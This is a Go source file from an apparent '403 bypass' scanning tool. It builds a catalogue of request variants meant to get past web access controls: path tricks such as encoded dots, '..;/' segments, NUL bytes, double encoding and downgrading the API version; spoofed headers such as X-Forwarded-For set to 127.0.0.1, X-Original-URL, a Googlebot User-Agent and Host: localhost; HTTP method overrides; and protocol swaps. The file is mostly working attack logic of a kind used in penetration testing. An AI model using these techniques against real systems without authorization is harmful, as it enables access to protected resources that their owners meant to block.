package bypass403

import (
	"regexp"
	"strconv"
	"strings"
)

// category groups related techniques for the UI (grouped sections) and for
// anyone reading a report later -- it carries no behavior of its own.
type category string

const (
	categoryPath     category = "path"
	categoryHeader   category = "header"
	categoryMethod   category = "method"
	categoryProtocol category = "protocol"
)

// attemptSpec is one bypass technique to try -- everything doAttempt/
// doRawRequest needs to fire the request, plus the human-readable identity a
// Result surfaces it under.
type attemptSpec struct {
	id          string
	category    category
	description string
	method      string
	target      string            // literal request-target (path + "?query"), see doAttempt
	headers     map[string]string // extra headers this attempt sends, beyond opts.Headers
	hostHeader  string            // overrides the Host header/authority; "" means the real host
	scheme      string            // overrides the connection scheme; "" means the baseline's own
	// raw routes this attempt through doRawRequest instead of the normal
	// client -- "http10" for a plain HTTP/1.0 request line, "no-host" for an
	// HTTP/1.1 request with no Host header at all. "" means the normal path.
	raw string
}

// splitLastSegment splits an escaped path into everything up to and
// including the final "/" (dir) and the segment after it (last) -- e.g.
// "/api/admin" -> ("/api/", "admin"), "/admin/" -> ("/admin/", ""), "/" ->
// ("/", ""). Every path-manipulation technique below builds off this rather
// than the raw string, so each one only has to reason about the final
// segment it's actually trying to disguise.
func splitLastSegment(path string) (dir, last string) {
	i := strings.LastIndexByte(path, '/')
	if i < 0 {
		return "/", path
	}
	return path[:i+1], path[i+1:]
}

// percentEncodeFirst percent-encodes just the first byte of s -- e.g. "admin"
// -> "%61dmin". A WAF rule that string-matches the literal path won't
// recognize the encoded form, while a backend that percent-decodes the path
// before routing resolves it right back to the real resource.
func percentEncodeFirst(s string) string {
	if s == "" {
		return s
	}
	return percentEncodeByte(s[0]) + s[1:]
}

// doublePercentEncodeFirst re-encodes the "%" of percentEncodeFirst's output,
// e.g. "admin" -> "%2561dmin" -- for the layer one level further out (a proxy
// that decodes once before a WAF check, with the backend decoding a second
// time) than percentEncodeFirst alone reaches.
func doublePercentEncodeFirst(s string) string {
	if s == "" {
		return s
	}
	return "%25" + percentEncodeFirst(s)[1:]
}

func percentEncodeByte(b byte) string {
	const hex = "0123456789ABCDEF"
	return string([]byte{'%', hex[b>>4], hex[b&0x0f]})
}

// versionSegment matches a lone API-version path segment ("v1", "v2", "v12",
// ...) -- see the version-downgrade attempts below.
var versionSegment = regexp.MustCompile(`^v[0-9]+$`)

// buildAttempts lists every technique this engine tries against one target.
// basePath/query are the baseline request's already-escaped path and raw
// query (see url.URL.EscapedPath/RawQuery); scheme is the baseline's own
// ("http"/"https"), used only to pick protocol-scheme-swap's target scheme.
// trustedReferer is a same-origin URL to present as Referer -- the closest
// safe default to "a domain the app already trusts" without this engine
// having to guess at one.
func buildAttempts(basePath, query, scheme, trustedReferer string) []attemptSpec {
	if basePath == "" {
		basePath = "/"
	}
	withQuery := func(path string) string {
		if query == "" {
			return path
		}
		return path + "?" + query
	}
	dir, last := splitLastSegment(basePath)
	trimmedNoSlash := strings.TrimSuffix(basePath, "/")
	trimmedNoLeadSlash := strings.TrimPrefix(basePath, "/")
	originalTarget := withQuery(basePath)

	var attempts []attemptSpec

	// --- Path manipulation: same resource, a path spelled differently
	// enough that a rule matching on the literal path (in a WAF, an nginx
	// `location` block, a hand-rolled auth check) stops recognizing it, while
	// whatever actually serves the page still resolves it to the same file.
	pathAttempt := func(id, desc, path string) {
		attempts = append(attempts, attemptSpec{id: id, category: categoryPath, description: desc, method: "GET", target: withQuery(path)})
	}

	toggledSlash := trimmedNoSlash
	if basePath == toggledSlash { // didn't have one -- add it
		toggledSlash += "/"
	}
	pathAttempt("path-trailing-slash-toggle", "Toggled the trailing slash", toggledSlash)
	pathAttempt("path-double-slash", "Doubled the slash immediately before the final path segment", dir+"/"+last)
	pathAttempt("path-double-slash-wrap", "Doubled the slash at both the start and end of the path", "//"+strings.Trim(basePath, "/")+"//")
	pathAttempt("path-dot-segment-suffix", "Appended a same-directory \".\" segment", trimmedNoSlash+"/.")
	pathAttempt("path-dot-segment-prefix", "Prefixed the path with a same-directory \".\" segment", "/."+trimmedNoLeadSlash)
	pathAttempt("path-dot-wrap-dotdot", "Wrapped the path in a \".\" prefix and a \"..\" suffix", "/."+basePath+"/..")
	pathAttempt("path-semicolon-param", "Appended a \"/..;/\" segment (some servlet containers strip \";\"-prefixed path parameters before routing)", trimmedNoSlash+"/..;/")
	pathAttempt("path-semicolon-prefix", "Prefixed the path with a bare \";\" segment", "/;"+trimmedNoLeadSlash)
	pathAttempt("path-dot-semicolon-prefix", "Prefixed the path with a \".;\" segment", "/.;"+trimmedNoLeadSlash)
	pathAttempt("path-double-slash-semicolon", "Prefixed the path with a \"//;//\" segment", "//;//"+trimmedNoLeadSlash)
	pathAttempt("path-uppercase", "Upper-cased the whole path", strings.ToUpper(basePath))
	pathAttempt("path-lowercase", "Lower-cased the whole path", strings.ToLower(basePath))
	pathAttempt("path-encode-first-char", "Percent-encoded the first character of the final path segment", dir+percentEncodeFirst(last))
	pathAttempt("path-double-encode-first-char", "Double percent-encoded the first character of the final path segment", dir+doublePercentEncodeFirst(last))
	pathAttempt("path-encoded-dot-prefix", "Prefixed the path with an encoded \".\" segment (/%2e/...)", "/%2e"+basePath)
	pathAttempt("path-double-encoded-dot-prefix", "Prefixed the path with a double percent-encoded \".\" segment (/%252e/...)", "/%252e"+basePath)
	pathAttempt("path-unicode-slash-prefix", "Prefixed the path with a fullwidth-slash homoglyph (decodes to another \"/\" in some stacks)", "/%ef%bc%8f"+trimmedNoLeadSlash)
	pathAttempt("path-trailing-space", "Appended a literal encoded space (%20) to the path", trimmedNoSlash+"%20")
	pathAttempt("path-trailing-tab", "Appended a literal encoded tab (%09) to the path", trimmedNoSlash+"%09")
	pathAttempt("path-trailing-nul", "Appended a literal encoded NUL byte (%00) to the path", trimmedNoSlash+"%00")
	pathAttempt("path-trailing-hash", "Appended a literal encoded \"#\" to the path", trimmedNoSlash+"%23")
	pathAttempt("path-trailing-question", "Appended a literal encoded \"?\" to the path", trimmedNoSlash+"%3f")
	pathAttempt("path-json-suffix", "Appended a \".json\" extension (some Ruby routing stacks treat it as a distinct route)", trimmedNoSlash+".json")
	pathAttempt("path-tilde-suffix", "Appended a \"/~\" suffix", trimmedNoSlash+"/~")

	// Version-downgrade: if the path has a lone "/vN/" segment (an API
	// version), retry it against every lower version number -- an older,
	// since-deprecated version of the same endpoint may never have picked up
	// a since-added access check.
	segments := strings.Split(trimmedNoLeadSlash, "/")
	for i, seg := range segments {
		if !versionSegment.MatchString(seg) {
			continue
		}
		var n int
		for _, c := range seg[1:] {
			n = n*10 + int(c-'0')
		}
		for v := 1; v < n; v++ {
			newSegments := append([]string{}, segments...)
			newSegments[i] = seg[:1] + strconv.Itoa(v)
			pathAttempt("path-version-downgrade-v"+strconv.Itoa(v), "Retried against API version v"+strconv.Itoa(v)+" instead of "+seg, "/"+strings.Join(newSegments, "/"))
		}
		break // only the first version segment -- a path rarely has two
	}

	// --- Header manipulation: same path, a header that makes an
	// access-control check further down the chain believe the request
	// originated somewhere it trusts (an internal rewrite, localhost, a
	// front-end proxy) instead of from the actual, untrusted client.
	headerAttempt := func(id, desc string, headers map[string]string) {
		attempts = append(attempts, attemptSpec{id: id, category: categoryHeader, description: desc, method: "GET", target: originalTarget, headers: headers})
	}
	headerAttempt("header-x-original-url", "Sent the real path in X-Original-URL against a different request path (some front-ends rewrite off this header)", map[string]string{"X-Original-URL": basePath})
	headerAttempt("header-x-rewrite-url", "Sent the real path in X-Rewrite-URL", map[string]string{"X-Rewrite-URL": basePath})
	for _, h := range []string{
		"X-Forwarded-For", "X-Forwarded", "Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
		"X-ProxyUser-Ip", "X-Client-IP", "Client-IP", "True-Client-IP", "Cluster-Client-IP", "X-Custom-IP-Authorization",
	} {
		headerAttempt("header-ip-"+strings.ToLower(h), "Claimed to be forwarded from 127.0.0.1 via "+h, map[string]string{h: "127.0.0.1"})
	}
	headerAttempt("header-x-forwarded-host", "Claimed to be forwarded from 127.0.0.1 via X-Forwarded-Host", map[string]string{"X-Forwarded-Host": "127.0.0.1"})
	headerAttempt("header-user-agent-googlebot", "Presented as Googlebot's User-Agent (some rules allowlist known crawlers)", map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"})
	if trustedReferer != "" {
		headerAttempt("header-referer", "Sent a same-origin Referer", map[string]string{"Referer": trustedReferer})
	}
	// Host-header attempts change the *authority* the server is asked to
	// route for, not a plain header -- doAttempt/doRawRequest keep dialing
	// the real host regardless (see hostHeader's doc comment).
	attempts = append(attempts, attemptSpec{id: "header-host-localhost", category: categoryHeader, description: "Sent the request with Host: localhost", method: "GET", target: originalTarget, hostHeader: "localhost"})
	attempts = append(attempts, attemptSpec{id: "header-host-removed", category: categoryHeader, description: "Sent the request with no Host header at all", method: "GET", target: originalTarget, raw: "no-host"})

	// --- Method tricks: same path, a different verb (or a header asking a
	// framework to treat the request as one) in case the access check is
	// only wired up in front of GET.
	methodAttempt := func(id, desc, method string, headers map[string]string) {
		attempts = append(attempts, attemptSpec{id: id, category: categoryMethod, description: desc, method: method, target: originalTarget, headers: headers})
	}
	methodAttempt("method-head", "Retried with HEAD", "HEAD", nil)
	methodAttempt("method-post", "Retried with POST", "POST", nil)
	methodAttempt("method-put", "Retried with PUT", "PUT", nil)
	methodAttempt("method-delete", "Retried with DELETE", "DELETE", nil)
	methodAttempt("method-patch", "Retried with PATCH", "PATCH", nil)
	methodAttempt("method-options", "Retried with OPTIONS", "OPTIONS", nil)
	methodAttempt("method-trace", "Retried with TRACE (may echo intermediate-proxy headers back)", "TRACE", nil)
	methodAttempt("method-override-header", "Sent POST with X-HTTP-Method-Override: GET", "POST", map[string]string{"X-HTTP-Method-Override": "GET"})
	methodAttempt("method-header", "Sent POST with X-HTTP-Method: GET", "POST", map[string]string{"X-HTTP-Method": "GET"})

	// --- Protocol tricks: same path and method, a different wire protocol
	// or scheme in case the access check lives in a layer that only applies
	// to one of them.
	attempts = append(attempts, attemptSpec{
		id: "protocol-http10", category: categoryProtocol,
		description: "Repeated the request over a plain HTTP/1.0 request line",
		method:      "GET", target: originalTarget, raw: "http10",
	})
	swapped := "https"
	if scheme == "https" {
		swapped = "http"
	}
	attempts = append(attempts, attemptSpec{
		id: "protocol-scheme-swap", category: categoryProtocol,
		description: "Retried over " + swapped + " instead of the original scheme",
		method:      "GET", target: originalTarget, scheme: swapped,
	})

	return attempts
}
